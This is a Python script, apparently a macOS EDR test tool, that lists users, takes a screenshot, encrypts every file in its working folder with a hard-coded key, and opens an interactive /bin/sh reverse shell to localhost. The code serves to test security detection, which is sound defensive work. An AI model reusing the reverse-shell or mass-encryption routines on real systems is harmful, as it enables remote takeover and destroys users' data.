#!/usr/bin/python3
#github.com/MMarianus

###########################################################################################
#                                                                                         #
#        - macOS EDR Provoker - A Python Script for basic EDR detections on a mac -       #
#                                                                                         #
# This Python script is designed to perform four tests that should trigger EDR (Endpoint  #
# Detection and Response) detections. The tests are designed to check the detection and   #
# response capabilities of your EDR solution, helping you ensure your system's            #
# security is operative and working properly.                                             #
#                                                                                         #
# After running the tests, observe your EDR console closely, as you might see some        #
# detections or suspicious activites in action!                                           #
#                                                                                         #
# [WARNING] - This script encrypts all files within the script's folder execution         #
#                                                                                         #
# The tests are: list users, take a screenshot, encrypt files and spawn a reverse shell   #
#                                                                                         #
# Usage: python3 macos-edr-provoker.py                                                    #
#                                                                                         #
###########################################################################################

# DISCLAIMER: This script is intended for legitimate testing/educational purposes only. 
# Use of this script on any system without proper authorization may lead to serious legal 
# and ethical consequences. The script creator is not responsible for any misuse or 
# damages caused by this script. Use it responsibly and at your own risk.

import subprocess
import time
import socket
import sys
import os

def list_mac_users() -> list:
    try:
        # Execute the dscl command to get a list of users
        result = subprocess.run(["dscl", ".", "list", "/Users"], capture_output=True, text=True)
        if result.returncode == 0:
            users = result.stdout.strip().split()
            return users
    except FileNotFoundError:
        print("dscl command not found. This script is intended for macOS only.")

def take_screenshot(file_path: str) -> None:
    try:
        # Execute the 'screencapture' command to take a screenshot
        subprocess.run(["screencapture", "-T", "1", file_path])
        print(f"Screenshot saved to {file_path}")
    except FileNotFoundError:
        print("screencapture command not found. This script is intended for macOS only.")

def encrypt_folder_contents(key: str) -> None:
    try:
        current_folder = os.getcwd()
        # Use the 'find' command to get a list of all files in the folder and its subfolders
        files_list = subprocess.run(["find", current_folder, "-type", "f"], capture_output=True, text=True)
        if files_list.returncode == 0:
            files = files_list.stdout.strip().split('\n')
            for file_path in files:
                # Use the 'openssl' command to encrypt each file with the specified key
                subprocess.run(["openssl", "enc", "-aes-256-cbc", "-salt", "-in", file_path, "-out", file_path + ".enc", "-k", key])
            print("Total files encrypted: {}".format(len(files)))
    except Exception as e:
        print("Error occurred while encrypting folder contents:", str(e))

def reverse_shell(target_ip: str, target_port: int) -> None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        os.dup2(s.fileno(), 0)  
        os.dup2(s.fileno(), 1)  
        os.dup2(s.fileno(), 2)  

        subprocess.call(["/bin/sh", "-i"])

    except Exception as e:
        print("Error occurred:", str(e))

def cool_intro() -> None:
    #Prints the usage disclaimer and a cool intro
    print("\n")
    print("               ######################################")
    print("               \033[31m# Welcome to the macOS EDR Provoker! # \033[37m")
    print("               ######################################")
    print("\n")
    print("\033[32m[DISCLAIMER]: This script is intended for legitimate testing/educational purposes only.\033[37m")
    print("\033[32mUse of this script on any system without proper authorization may lead to serious legal\033[37m")
    print("\033[32mand ethical consequences. The script creator is not responsible for any misuse or\033[37m")
    print("\033[32mdamages caused by this script. Use it responsibly and at your own risk.\033[37m")
    print("\n")
    time.sleep(2.5)
    print("This is a Python script designed to perform four tests on macOS to trigger EDR detections.")
    print("  [#] - The basic tests are: list users, take a screenshot, encrypt files and spawn a reverse shell.")
    print("\nAfter the execution, watch closely as you should see detections within the EDR console :)")
    print("\nExecuting the tests in 3... 2... 1...\n\n")
    time.sleep(3)

if __name__ == "__main__":
    cool_intro()
    
    response = input("[?]- Do you want to start the tests? (Y/n): ").strip()
    if response == "Y":
        # Test 1: list mac users
        print("\nTest 1: Listing users...")
        users = list_mac_users()
        if users:
            print("Total users: {}".format(len(users)))

        # Test 2: take a screenshot
        print("\nTest 2: Taking a screenshot...")
        screenshot_file_path = "screenshot.png"
        take_screenshot(screenshot_file_path)

        # Test 3: Encrypt files within a folder and its subfolders
        # Warning: Starts encrypting from the folder where this script is located
        key = "1234"
        response = input("\n[?]- Do you want to encrypt the folder contents? (Y/n): ").strip()
        if response == "Y":
            print("Test 3: Encrypting files...")
            encrypt_folder_contents(key)
        elif response == "n":
            print("Encryption skipped.")

        # Test 4: Start a reverse shell
        print("\nTest 4: Starting a reverse shell...")
        reverse_shell("127.0.0.1", 1337)

        print("\nFinished! - Please check your EDR console to see any detections!.\n")
    else:
        print("Testing skipped! :( \n")
